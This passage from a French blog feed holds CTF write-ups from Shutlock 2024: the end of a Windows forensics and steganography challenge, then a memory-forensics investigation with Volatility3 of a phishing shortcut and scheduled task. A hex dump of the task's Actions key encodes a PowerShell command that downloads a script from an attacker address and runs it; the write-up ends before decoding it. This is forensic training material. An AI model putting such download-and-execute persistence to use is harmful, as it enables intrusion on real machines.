+<p>Cette base de données située dans <code>FileSystem/AppData/Local/ConnectedDevicesPlatform/L.clara/</code> enregistre les activitées de l&rsquo;utilisateur sur le poste, on peut l&rsquo;ouvir avec des outils tel que <a href="https://sqlitebrowser.org/">sqlitebrowser</a>.</p>
+<p>En parcourant cette dernière, dans la table <strong>Activity</strong>, on finit par remarque à la ligne 14 l&rsquo;application <strong>Microsoft.MicrosoftStickyNotes_8wekyb3d8bbwe!App</strong>.</p>
+<p>Ni une ni deux, on part explorer l&rsquo;arborescence <code>FileSystem/AppData/Local/Packages/Microsoft.MicrosoftStickyNotes_8wekyb3d8bbwe/</code> (<strong>&hellip;/Packages/</strong> contenant les données de toutes les application).</p>
+<p>On trouve alors la BDD <strong>plum.sqlite</strong> (contenue dans le dossier LocalState) contenant le contenu des notes:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-txt" data-lang="txt"><span class="line"><span class="cl">pwd importante recherche: s3cr3t_r3ch3rch3_pwd_!
+</span></span></code></pre></div><p>Super ! On a enfin notre&hellip; flag ?</p>
+<p>Bien que le mot de passe permet effectivement d&rsquo;ouvrir l&rsquo;archive, on obtient alors seulement deux fichiers, <strong>chiffrement.jpeg</strong> et <strong>recherches_algorithmes_de_chiffrement.pdf</strong> ne donnant aucun flag (et évidemment, <strong>SHLK{s3cr3t_r3ch3rch3_pwd_!}</strong> ne fonctionne pas).</p>
+<h3 id="stéganographie">Stéganographie</h3>
+<p>Ouvir l&rsquo;archive étant une étape nécessaire dans la résolution, il est très peu probable que le flag soit caché dans le dossier <strong>AppData</strong>, on va alors se concentrer sur les deux fichiers extraits sur lesquels il nous reste plus qu&rsquo;a faire de la stéganographie.</p>
+<p>J&rsquo;ai alors choisit de commencer par l&rsquo;image car c&rsquo;est l&rsquo;endroit le plus répandu en stégano pour cacher des choses, et pour cela, plusieurs sont possibles:</p>
+<ul>
+<li>strings: Aucun résultat</li>
+<li>binwalk: Aucun résultat</li>
+<li>Exif: Aucun résultat</li>
+<li>steghide: Fichier embarqué - flag.txt</li>
+<li><a href="https://www.aperisolve.com">Aperisolve</a>: Fichier embarqué - flag.txt</li>
+</ul>
+<p>Steghide et Aperisolve ont trouvés un fichier <strong>flag.txt</strong>, on l&rsquo;extrait et on récupère le flag: <code>SHLK{4uri3z-v0us_cl1qu3r}</code>.</p>
+<h2 id="sources">Sources</h2>
+<ul>
+<li><a href="https://cybermeisam.medium.com/blue-team-system-live-analysis-part-8-windows-user-account-forensics-profile-folder-appdata-7f07a0870584">https://cybermeisam.medium.com/blue-team-system-live-analysis-part-8-windows-user-account-forensics-profile-folder-appdata-7f07a0870584</a></li>
+<li><a href="https://medium.com/@joeforensics/digital-forensics-windows-10-timeline-activitescache-db-82b4bc9f715a">https://medium.com/@joeforensics/digital-forensics-windows-10-timeline-activitescache-db-82b4bc9f715a</a></li>
+<li><a href="https://book.hacktricks.xyz/generic-methodologies-and-resources/basic-forensic-methodology/windows-forensics">https://book.hacktricks.xyz/generic-methodologies-and-resources/basic-forensic-methodology/windows-forensics</a></li>
+</ul>
+]]></content>
+		</item>
+		
+		<item>
+			<title>Shutlock 2024 - Enquête sur le phishing des JO : Retracer l&#39;attaque 1/2</title>
+			<link>http://localhost:1313/posts/shutlock2024_phishing_1-2/shutlock2024_phishing_1-2/</link>
+			<pubDate>Fri, 12 Jul 2024 08:20:30 +0200</pubDate>
+			
+			<guid>http://localhost:1313/posts/shutlock2024_phishing_1-2/shutlock2024_phishing_1-2/</guid>
+			<description><![CDATA[%!s(<nil>)]]></description>
+			<content type="html"><![CDATA[<div>
+  <img src="/posts/shutlock2024_phishing_1-2/images/shutlock.png" alt="Logo_Shutlock">
+</div>
+<p>Ceci est le write-up de la première partie du challenge Forensic <strong>Enquête sur le phishing des JO</strong> du CTF <a href="https://shutlock.fr/">Shutlock</a> édition 2024 organisé par la DGSI et EPITA.</p>
+<h2 id="énoncé">Énoncé</h2>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-txt" data-lang="txt"><span class="line"><span class="cl">Mike O&#39;Soft a été averti d&#39;une campagne de phishing par le groupe THE HAMOR. Une des personnes ayant reçu le mail de phishing en question, s&#39;est faite piegée.
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">Vous avez pour mission de mener l&#39;enquête. Heureusement pour vous, les équipes du ministère ont réalisé un dump mémoire sur la machine. Dans la suite de votre enquête, un dump réseau vous sera confié.
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">Sauriez-vous retracer ce qu&#39;il s&#39;est passé sur ce poste ?
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">Pour résoudre ce challenge, vous devez répondre aux questions suivantes :
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">1 - Quel est le nom du raccourci malveillant ?
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">2 - Quel est le nom de la scheduled task créé ?
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">3 - Quel script est lancé par cette scheduled task ?
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">Format du flag SHLK{&#39;nom-fichier&#39;-&#39;scheduled task-&#39;script&#39;}
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">Exemple:
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">1 - File : ctf\shutlock.test
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">2 - scheduled task : ScheduleTaskName
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">3 - script : ThisIsTheScript.sh
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">SHLK{shutlock.test-ScheduleTaskName-ThisIsTheScript.sh}
+</span></span></code></pre></div><p>Il nous est alors donné un dump mémoire (<strong>dump.raw</strong>) ainsi que le screenshot du bureau du PC ci-dessous:</p>
+<div>
+  <img src="/posts/shutlock2024_phishing_1-2/images/Ordi.png" alt="Ordi.png">
+</div>
+<hr>
+<h2 id="investigation">Investigation</h2>
+<p>D&rsquo;après l&rsquo;énoncé, on sait que la personne à ouvert un mail contenant un raccourcis piégé, raccourcis qui a créé une tâche planifiée lançant un script malveillant.</p>
+<p>D&rsquo;après le screenshot, le raccourcis serait lié à un PDF de tirage au sort pour les JO 2024 situé dans le dossier <strong>Downloads</strong>.</p>
+
+    <aside class="admonition note">
+        <div class="admonition-title">
+            <div class="icon"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-edit-2"><path d="M17 3a2.828 2.828 0 1 1 4 4L7.5 20.5 2 22l1.5-5.5L17 3z"></path></svg></div><b>Note</b>
+        </div>
+        <div class="admonition-content">Je vais ici utiliser <a href="https://github.com/volatilityfoundation/volatility3">Volatility3</a> pour parcourir la mémoire.</div>
+    </aside>
+<p>Avant de commencer l&rsquo;investigation en elle-même, il est important de déterminer l&rsquo;OS du PC.</p>
+<h3 id="déterminer-los">Déterminer l&rsquo;OS</h3>
+<p>On va commencer par vérifier si le PC tourne sous Windows, car c&rsquo;est l&rsquo;OS plus courant (en CTF comme dans la réalité).</p>
+<p>On utilise alors la commande <code>windows.info</code></p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-sh" data-lang="sh"><span class="line"><span class="cl">sudo vol -f dump.raw windows.info
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">Volatility <span class="m">3</span> Framework 2.5.2
+</span></span><span class="line"><span class="cl">Progress:  100.00               PDB scanning finished                                                                                              
+</span></span><span class="line"><span class="cl">Variable        Value
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">Kernel Base     0xf80479000000
+</span></span><span class="line"><span class="cl">DTB     0x1aa000
+</span></span><span class="line"><span class="cl">Symbols file:///usr/lib/python3.12/site-packages/volatility3/symbols/windows/ntkrnlmp.pdb/C7DF30B22252078525B414CC51B257D3-1.json.xz
+</span></span><span class="line"><span class="cl">Is64Bit True
+</span></span><span class="line"><span class="cl">IsPAE   False
+</span></span><span class="line"><span class="cl">layer_name      <span class="m">0</span> WindowsIntel32e
+</span></span><span class="line"><span class="cl">memory_layer    <span class="m">1</span> FileLayer
+</span></span><span class="line"><span class="cl">KdVersionBlock  0xf80479c0f400
+</span></span><span class="line"><span class="cl">Major/Minor     15.19041
+</span></span><span class="line"><span class="cl">MachineType     <span class="m">34404</span>
+</span></span><span class="line"><span class="cl">KeNumberProcessors      <span class="m">6</span>
+</span></span><span class="line"><span class="cl">SystemTime      2024-06-07 19:33:51
+</span></span><span class="line"><span class="cl">NtSystemRoot    C:<span class="se">\W</span>indows
+</span></span><span class="line"><span class="cl">NtProductType   NtProductWinNt
+</span></span><span class="line"><span class="cl">NtMajorVersion  <span class="m">10</span>
+</span></span><span class="line"><span class="cl">NtMinorVersion  <span class="m">0</span>
+</span></span><span class="line"><span class="cl">PE MajorOperatingSystemVersion  <span class="m">10</span>
+</span></span><span class="line"><span class="cl">PE MinorOperatingSystemVersion  <span class="m">0</span>
+</span></span><span class="line"><span class="cl">PE Machine      <span class="m">34404</span>
+</span></span><span class="line"><span class="cl">PE TimeDateStamp        Thu Apr <span class="m">13</span> 14:51:37 <span class="m">2062</span>
+</span></span></code></pre></div><p>On apprend alors que le PC est sous Windows 10 ainsi que d&rsquo;autres informations comme la date système (donc du dump), etc.</p>
+<p>Si cette commande n&rsquo;avait rien donné on aurait pu essayer d&rsquo;extraire une bannière Linux avec la commande <code>banners</code>.</p>
+<h3 id="extraction-des-objets-courants">Extraction des objets courants</h3>
+<p>Maintenant que nous sommes certain de l&rsquo;OS utilisé, on va pouvoir commencer l&rsquo;analyse, afin de me faciliter la tâche pour plus tard, j&rsquo;extrais le résultat de <code>filescan</code>, <code>cmdline</code>, <code>pstree</code> et <code>netscan</code> dans des fichiers.</p>
+<pre tabindex="0"><code>sudo vol -f dump.raw windows.filescan &gt; filescan
+sudo vol -f dump.raw windows.cmdline &gt; cmdline
+sudo vol -f dump.raw windows.pstree &gt; pstree
+sudo vol -f dump.raw windows.netscan &gt; netscan
+</code></pre><p>Cela me permet de gagner en rapidité en faisant un <code>grep</code> dans le fichier plutôt que de lancer une extraction à chaque fois.</p>
+<h3 id="flag-13---raccourcis-malveillant">Flag 1/3 - Raccourcis malveillant</h3>
+<p>La première partie du flag est le nom du raccourcis malveillant, sur Windows, les raccourcis ont comme extension <code>.lnk</code>, c&rsquo;est donc ce que je vais chercher dans le fichier <code>filescan</code> créé précédemment:</p>
+<pre tabindex="0"><code>cat filescan | grep &#34;.lnk&#34;
+0xa70451a45a80  \Users\clara\Downloads\Tirage_au_sort_pour_gagner_des_places_aux_Jeux_Olympiques_de_Paris_2024\Tirage_au_sort_pour_gagner_des_places_aux_Jeux_Olympiques_de_Paris_2024.pdf.lnk  216
+0xa7045384fe90  \Users\clara\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\System Tools\File Explorer.lnk       216
+</code></pre><p>Tiens, un raccourcis en .pdf.lnk dans le dossier <strong>Downloads</strong> !</p>
+<p>On a maintenant la première partie du flag: <strong>Tirage_au_sort_pour_gagner_des_places_aux_Jeux_Olympiques_de_Paris_2024.pdf.lnk</strong></p>
+<p>On peut essayer de l&rsquo;extraire et voir ou il mène (avec <a href="https://github.com/Matmaus/LnkParse3">LnkParse3</a> sous Linux) mais il n&rsquo;y a pas de lien de redirection dans le fichier.</p>
+<h3 id="flag-23---tâche-planifiée">Flag 2/3 - Tâche planifiée</h3>
+<p>Les tâches planifiées sous Windows ne sont pas présentes sous forme de fichier mais dans les registres aux adresses suivantes:</p>
+<pre tabindex="0"><code>HKLM\Software\Microsoft\Windows NT\CurrentVersion\Schedule\Taskcache\Tree
+HKLM\Software\Microsoft\Windows NT\CurrentVersion\Schedule\Taskcache\Tasks
+</code></pre><p>Le premier registre contient la <strong>liste</strong> des tâches planifiées et le second leur <strong>contenu</strong> (Actions, Author, URL, Trigger, etc).</p>
+<p>On va donc afficher la liste des ruches disponibles avec la commande <code>windows.registry.hivelist</code>:</p>
+<pre tabindex="0"><code>sudo vol -f dump.raw windows.registry.hivelist
+
+Volatility 3 Framework 2.5.2
+Progress:  100.00               PDB scanning finished                        
+Offset  FileFullPath    File output
+
+0xb9044f873000          Disabled
+0xb9044f889000  \REGISTRY\MACHINE\SYSTEM        Disabled
+0xb9044fc80000  \REGISTRY\MACHINE\HARDWARE      Disabled
+0xb90450c50000  \SystemRoot\System32\Config\SECURITY    Disabled
+0xb90450c52000  \SystemRoot\System32\Config\SAM Disabled
+0xb90450c56000  \SystemRoot\System32\Config\DEFAULT     Disabled
+0xb90450c0f000  \SystemRoot\System32\Config\SOFTWARE    Disabled
+0xb9045317d000  \Device\HarddiskVolume1\Boot\BCD        Disabled
+0xb9045c3b6000  \??\C:\Windows\ServiceProfiles\NetworkService\NTUSER.DAT        Disabled
+0xb90453321000  \??\C:\Windows\ServiceProfiles\LocalService\NTUSER.DAT  Disabled
+0xb90453323000  \SystemRoot\System32\Config\BBI Disabled
+0xb90454d3d000  \??\C:\Windows\AppCompat\Programs\Amcache.hve   Disabled
+0xb90454e10000  \??\C:\Users\clara\ntuser.dat   Disabled
+0xb90454e20000  \??\C:\Users\clara\AppData\Local\Microsoft\Windows\UsrClass.dat Disabled
+0xb90456305000  \??\C:\ProgramData\Microsoft\Windows\AppRepository\Packages\MicrosoftWindows.Client.CBS_1000.19053.1000.0_x64__cw5n1h2txyewy\ActivationStore.dat        Disabled
+0xb904561ee000  \??\C:\ProgramData\Microsoft\Windows\AppRepository\Packages\Microsoft.Windows.StartMenuExperienceHost_10.0.19041.3636_neutral_neutral_cw5n1h2txyewy\ActivationStore.dat Disabled
+0xb904561e1000  \??\C:\Users\clara\AppData\Local\Packages\Microsoft.Windows.StartMenuExperienceHost_cw5n1h2txyewy\Settings\settings.dat Disabled
+0xb90456571000  \??\C:\ProgramData\Microsoft\Windows\AppRepository\Packages\Microsoft.Windows.Search_1.14.10.19041_neutral_neutral_cw5n1h2txyewy\ActivationStore.dat    Disabled
+0xb9045657c000  \??\C:\Users\clara\AppData\Local\Packages\Microsoft.Windows.Search_cw5n1h2txyewy\Settings\settings.dat  Disabled
+...
+</code></pre><p>On en a pas mal mais celle qui nous intéresse est la <strong>Software</strong> (<code>0xb90450c0f000  \SystemRoot\System32\Config\SOFTWARE</code>).</p>
+<p>On va donc naviguer à travers cette dernière jusqu&rsquo;a arriver à l&rsquo;adresse <strong>&hellip;\TaskCache\Tree</strong>, qui contient la liste des tâches planifiées, pour ensuite afficher ses clés:</p>
+<pre tabindex="0"><code>sudo vol -f dump.raw windows.registry.printkey.PrintKey --offset 0xb90450c0f000 --key &#39;Microsoft\Windows NT\CurrentVersion\Schedule\TaskCache\Tree&#39;
+
+Volatility 3 Framework 2.5.2
+Progress:  100.00               PDB scanning finished                        
+Last Write Time Hive Offset     Type    Key     Name    Data    Volatile
+
+2024-06-07 19:30:24.000000      0xb90450c0f000  Key     \SystemRoot\System32\Config\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Schedule\TaskCache\Tree        IGotYourFileInfo                False
+2019-12-07 09:18:13.000000      0xb90450c0f000  Key     \SystemRoot\System32\Config\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Schedule\TaskCache\Tree        Microsoft               False
+2023-12-04 20:41:13.000000      0xb90450c0f000  Key     \SystemRoot\System32\Config\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Schedule\TaskCache\Tree        MicrosoftEdgeUpdateTaskMachineCore              False
+2023-12-04 20:41:13.000000      0xb90450c0f000  Key     \SystemRoot\System32\Config\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Schedule\TaskCache\Tree        MicrosoftEdgeUpdateTaskMachineUA                False
+2024-01-11 20:51:18.000000      0xb90450c0f000  Key     \SystemRoot\System32\Config\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Schedule\TaskCache\Tree        npcapwatchdog           False
+2023-12-04 20:50:33.000000      0xb90450c0f000  Key     \SystemRoot\System32\Config\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Schedule\TaskCache\Tree        OneDrive Reporting Task-S-1-5-21-1569816960-1500504362-1823058107-1000            False
+2024-06-05 20:33:34.000000      0xb90450c0f000  Key     \SystemRoot\System32\Config\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Schedule\TaskCache\Tree        OneDrive Standalone Update Task-S-1-5-21-1569816960-1500504362-1823058107-1000            False
+2024-06-07 19:30:24.000000      0xb90450c0f000  REG_BINARY      \SystemRoot\System32\Config\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Schedule\TaskCache\Tree        SD      &#34;
+...
+</code></pre><p>Le décalage indiqué avec <code>--offset</code> correspond à l&rsquo;adresse de la ruche <code>\SystemRoot\System32\Config\SOFTWARE</code> comme vu plus haut.</p>
+<p>On a une tâche qui saute aux yeux, il s&rsquo;agit de <strong>IGotYourFileInfo</strong>, c&rsquo;est la deuxième partie du flag.</p>
+<h3 id="flag-33---script">Flag 3/3 - Script</h3>
+<p>Pour la dernière partie du flag, il faut trouver le nom du script lancé par la tâche planifiée <strong>IGotYourFileInfo</strong>.</p>
+<p>Comme vu plus haut, le registre <strong>Tree</strong> stock la liste des tâches planifiées, chaque tâche à une sous-clé ID (par exemple <strong>{6078ADB5-6D31-4965-AC02-A716F3DC7ADB}</strong>) qui permet de l&rsquo;identifier dans le registre <strong>Tasks</strong>.</p>
+<p>Malheureusement l&rsquo;extraction des sous-clés de la tâche avec la commande <code>sudo vol -f dump.raw windows.registry.printkey.PrintKey --offset 0xb90450c0f000 --key 'Microsoft\Windows NT\CurrentVersion\Schedule\TaskCache\Tree\IGotYourFileInfo'</code> ne donne rien, j&rsquo;ai donc du extraire toutes les clés et sous clés du registre <strong>Tasks</strong> avec la fonction <strong>recurse</strong> dans un fichier et l&rsquo;analyser à la main.</p>
+<p>Pour faire ça, j&rsquo;ai utilisé la commande suivante: <code>sudo vol -f dump.raw windows.registry.printkey.PrintKey --offset 0xb90450c0f000 --key 'Microsoft\Windows NT\CurrentVersion\Schedule\TaskCache\Tasks' --recurse &gt; printkey</code>.</p>
+<p>Ensuite, il faut ouvrir le fichier <strong>printkey</strong> dans une éditeur de texte et rechercher la tâche <strong>IGotYourFileInfo</strong>, ce qui nous donne tout ça:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-txt" data-lang="txt"><span class="line"><span class="cl">...
+</span></span><span class="line"><span class="cl">2024-06-07 19:30:25.000000 	0xb90450c0f000	Key	\SystemRoot\System32\Config\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Schedule\TaskCache\Tasks	{0669B1EB-ED96-4F61-802F-AB93D8FD0D30}		False
+</span></span><span class="line"><span class="cl">* 2024-06-07 19:30:25.000000 	0xb90450c0f000	REG_SZ	\SystemRoot\System32\Config\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Schedule\TaskCache\Tasks\{0669B1EB-ED96-4F61-802F-AB93D8FD0D30}	Path	&#34;\IGotYourFileInfo&#34;	False
+</span></span><span class="line"><span class="cl">* 2024-06-07 19:30:25.000000 	0xb90450c0f000	REG_BINARY	\SystemRoot\System32\Config\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Schedule\TaskCache\Tasks\{0669B1EB-ED96-4F61-802F-AB93D8FD0D30}	Hash	&#34;
+</span></span><span class="line"><span class="cl">86 0f fd 71 5f 13 18 7a	...q_..z
+</span></span><span class="line"><span class="cl">33 f3 ad 14 d2 54 f2 c5	3....T..
+</span></span><span class="line"><span class="cl">ae c4 22 6f 15 ac 09 c4	..&#34;o....
+</span></span><span class="line"><span class="cl">bf ac 99 88 be 18 ce c7	........&#34;	False
+</span></span><span class="line"><span class="cl">* 2024-06-07 19:30:25.000000 	0xb90450c0f000	REG_DWORD	\SystemRoot\System32\Config\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Schedule\TaskCache\Tasks\{0669B1EB-ED96-4F61-802F-AB93D8FD0D30}	Schema	65538	False
+</span></span><span class="line"><span class="cl">* 2024-06-07 19:30:25.000000 	0xb90450c0f000	REG_SZ	\SystemRoot\System32\Config\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Schedule\TaskCache\Tasks\{0669B1EB-ED96-4F61-802F-AB93D8FD0D30}	Date	&#34;2024-06-07T21:30:24&#34;	False
+</span></span><span class="line"><span class="cl">* 2024-06-07 19:30:25.000000 	0xb90450c0f000	REG_SZ	\SystemRoot\System32\Config\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Schedule\TaskCache\Tasks\{0669B1EB-ED96-4F61-802F-AB93D8FD0D30}	Author	&#34;DEANGILMOR\clara&#34;	False
+</span></span><span class="line"><span class="cl">* 2024-06-07 19:30:25.000000 	0xb90450c0f000	REG_SZ	\SystemRoot\System32\Config\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Schedule\TaskCache\Tasks\{0669B1EB-ED96-4F61-802F-AB93D8FD0D30}	URI	&#34;\IGotYourFileInfo&#34;	False
+</span></span><span class="line"><span class="cl">* 2024-06-07 19:30:25.000000 	0xb90450c0f000	REG_BINARY	\SystemRoot\System32\Config\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Schedule\TaskCache\Tasks\{0669B1EB-ED96-4F61-802F-AB93D8FD0D30}	Triggers	&#34;
+</span></span><span class="line"><span class="cl">17 00 00 00 00 00 00 00	........
+</span></span><span class="line"><span class="cl">01 07 06 00 00 00 07 00	........
+</span></span><span class="line"><span class="cl">00 fc cc d9 21 b9 da 01	....!...
+</span></span><span class="line"><span class="cl">00 07 06 00 00 00 07 00	........
+</span></span><span class="line"><span class="cl">ff ff ff ff ff ff ff ff	........
+</span></span><span class="line"><span class="cl">38 21 41 42 48 48 48 48	8!ABHHHH
+</span></span><span class="line"><span class="cl">09 df 08 16 48 48 48 48	....HHHH
+</span></span><span class="line"><span class="cl">0e 00 00 00 48 48 48 48	....HHHH
+</span></span><span class="line"><span class="cl">41 00 75 00 74 00 68 00	A.u.t.h.
+</span></span><span class="line"><span class="cl">6f 00 72 00 00 00 48 48	o.r...HH
+</span></span><span class="line"><span class="cl">00 00 00 00 48 48 48 48	....HHHH
+</span></span><span class="line"><span class="cl">00 48 48 48 48 48 48 48	.HHHHHHH
+</span></span><span class="line"><span class="cl">00 48 48 48 48 48 48 48	.HHHHHHH
+</span></span><span class="line"><span class="cl">01 00 00 00 48 48 48 48	....HHHH
+</span></span><span class="line"><span class="cl">1c 00 00 00 48 48 48 48	....HHHH
+</span></span><span class="line"><span class="cl">01 05 00 00 00 00 00 05	........
+</span></span><span class="line"><span class="cl">15 00 00 00 80 81 91 5d	.......]
+</span></span><span class="line"><span class="cl">2a e1 6f 59 bb a8 a9 6c	*.oY...l
+</span></span><span class="line"><span class="cl">e8 03 00 00 48 48 48 48	....HHHH
+</span></span><span class="line"><span class="cl">22 00 00 00 48 48 48 48	&#34;...HHHH
+</span></span><span class="line"><span class="cl">44 00 45 00 41 00 4e 00	D.E.A.N.
+</span></span><span class="line"><span class="cl">47 00 49 00 4c 00 4d 00	G.I.L.M.
+</span></span><span class="line"><span class="cl">4f 00 52 00 5c 00 63 00	O.R.\.c.
+</span></span><span class="line"><span class="cl">6c 00 61 00 72 00 61 00	l.a.r.a.
+</span></span><span class="line"><span class="cl">00 00 48 48 48 48 48 48	..HHHHHH
+</span></span><span class="line"><span class="cl">2c 00 00 00 48 48 48 48	,...HHHH
+</span></span><span class="line"><span class="cl">58 02 00 00 10 0e 00 00	X.......
+</span></span><span class="line"><span class="cl">80 f4 03 00 ff ff ff ff	........
+</span></span><span class="line"><span class="cl">07 00 00 00 00 00 00 00	........
+</span></span><span class="line"><span class="cl">00 00 00 00 00 00 00 00	........
+</span></span><span class="line"><span class="cl">00 00 00 00 00 00 00 00	........
+</span></span><span class="line"><span class="cl">00 00 00 00 48 48 48 48	....HHHH
+</span></span><span class="line"><span class="cl">dd dd 00 00 00 00 00 00	........
+</span></span><span class="line"><span class="cl">01 07 06 00 00 00 07 00	........
+</span></span><span class="line"><span class="cl">00 fc cc d9 21 b9 da 01	....!...
+</span></span><span class="line"><span class="cl">00 00 00 00 00 00 00 00	........
+</span></span><span class="line"><span class="cl">00 00 00 00 00 00 00 00	........
+</span></span><span class="line"><span class="cl">00 00 00 00 00 00 00 00	........
+</span></span><span class="line"><span class="cl">00 00 00 00 00 00 00 00	........
+</span></span><span class="line"><span class="cl">10 0e 00 00 00 00 00 00	........
+</span></span><span class="line"><span class="cl">ff ff ff ff 00 00 00 00	........
+</span></span><span class="line"><span class="cl">00 00 00 00 00 00 00 00	........
+</span></span><span class="line"><span class="cl">00 01 5a 2b 01 00 00 00	..Z+....
+</span></span><span class="line"><span class="cl">00 00 00 00 9f 68 00 00	.....h..
+</span></span><span class="line"><span class="cl">00 00 00 00 48 48 48 48	....HHHH&#34;	False
+</span></span><span class="line"><span class="cl">* 2024-06-07 19:30:25.000000 	0xb90450c0f000	REG_BINARY	\SystemRoot\System32\Config\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Schedule\TaskCache\Tasks\{0669B1EB-ED96-4F61-802F-AB93D8FD0D30}	Actions	&#34;
+</span></span><span class="line"><span class="cl">03 00 0c 00 00 00 41 00	......A.
+</span></span><span class="line"><span class="cl">75 00 74 00 68 00 6f 00	u.t.h.o.
+</span></span><span class="line"><span class="cl">72 00 66 66 00 00 00 00	r.ff....
+</span></span><span class="line"><span class="cl">22 00 00 00 49 00 6e 00	&#34;...I.n.
+</span></span><span class="line"><span class="cl">76 00 6f 00 6b 00 65 00	v.o.k.e.
+</span></span><span class="line"><span class="cl">2d 00 57 00 65 00 62 00	-.W.e.b.
+</span></span><span class="line"><span class="cl">52 00 65 00 71 00 75 00	R.e.q.u.
+</span></span><span class="line"><span class="cl">65 00 73 00 74 00 f4 00	e.s.t...
+</span></span><span class="line"><span class="cl">00 00 2d 00 55 00 72 00	..-.U.r.
+</span></span><span class="line"><span class="cl">69 00 20 00 68 00 74 00	i...h.t.
+</span></span><span class="line"><span class="cl">74 00 70 00 3a 00 2f 00	t.p.:./.
+</span></span><span class="line"><span class="cl">2f 00 31 00 37 00 32 00	/.1.7.2.
+</span></span><span class="line"><span class="cl">2e 00 32 00 31 00 2e 00	..2.1...
+</span></span><span class="line"><span class="cl">31 00 39 00 35 00 2e 00	1.9.5...
+</span></span><span class="line"><span class="cl">31 00 37 00 3a 00 35 00	1.7.:.5.
+</span></span><span class="line"><span class="cl">30 00 30 00 30 00 2f 00	0.0.0./.
+</span></span><span class="line"><span class="cl">48 00 6f 00 6c 00 6d 00	H.o.l.m.
+</span></span><span class="line"><span class="cl">65 00 73 00 2f 00 47 00	e.s./.G.
+</span></span><span class="line"><span class="cl">65 00 74 00 46 00 69 00	e.t.F.i.
+</span></span><span class="line"><span class="cl">6c 00 65 00 49 00 6e 00	l.e.I.n.
+</span></span><span class="line"><span class="cl">66 00 6f 00 2e 00 70 00	f.o...p.
+</span></span><span class="line"><span class="cl">73 00 31 00 20 00 2d 00	s.1...-.
+</span></span><span class="line"><span class="cl">4f 00 75 00 74 00 46 00	O.u.t.F.
+</span></span><span class="line"><span class="cl">69 00 6c 00 65 00 20 00	i.l.e...
+</span></span><span class="line"><span class="cl">47 00 65 00 74 00 46 00	G.e.t.F.
+</span></span><span class="line"><span class="cl">69 00 6c 00 65 00 73 00	i.l.e.s.
+</span></span><span class="line"><span class="cl">49 00 6e 00 66 00 6f 00	I.n.f.o.
+</span></span><span class="line"><span class="cl">2e 00 70 00 73 00 31 00	..p.s.1.
+</span></span><span class="line"><span class="cl">20 00 3b 00 20 00 53 00	..;...S.
+</span></span><span class="line"><span class="cl">74 00 61 00 72 00 74 00	t.a.r.t.
+</span></span><span class="line"><span class="cl">2d 00 50 00 72 00 6f 00	-.P.r.o.
+</span></span><span class="line"><span class="cl">63 00 65 00 73 00 73 00	c.e.s.s.
+</span></span><span class="line"><span class="cl">20 00 2d 00 46 00 69 00	..-.F.i.
+</span></span><span class="line"><span class="cl">6c 00 65 00 50 00 61 00	l.e.P.a.
+</span></span><span class="line"><span class="cl">74 00 68 00 20 00 47 00	t.h...G.
+</span></span><span class="line"><span class="cl">65 00 74 00 46 00 69 00	e.t.F.i.
+</span></span><span class="line"><span class="cl">6c 00 65 00 73 00 49 00	l.e.s.I.
+</span></span><span class="line"><span class="cl">6e 00 66 00 6f 00 2e 00	n.f.o...
+</span></span><span class="line"><span class="cl">70 00 73 00 31 00 00 00	p.s.1...&#34;	False
+</span></span><span class="line"><span class="cl">* 2024-06-07 19:30:25.000000 	0xb90450c0f000	REG_BINARY	\SystemRoot\System32\Config\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Schedule\TaskCache\Tasks\{0669B1EB-ED96-4F61-802F-AB93D8FD0D30}	DynamicInfo	&#34;
+</span></span><span class="line"><span class="cl">03 00 00 00 fd 09 2f 25	....../%
+</span></span><span class="line"><span class="cl">11 b9 da 01 00 00 00 00	........
+</span></span><span class="line"><span class="cl">00 00 00 00 00 00 00 00	........
+</span></span><span class="line"><span class="cl">00 00 00 00 00 00 00 00	........&#34;	False
+</span></span><span class="line"><span class="cl">...
+</span></span></code></pre></div><p>On retrouve les différents champs, correspondant aux sous-clés de registre tel que URL, Trigger, Author, etc. Qui sont bien présents si on regarde dans <strong>regedit</strong>.</p>
+<p>Ce qui nous intéresse ici est la sous-clé <strong>Actions</strong>, sous cette dernière on retrouve l&rsquo;appel du script en hexadécimal, un passage dans cyberchef plus tard on obtient ça:</p>
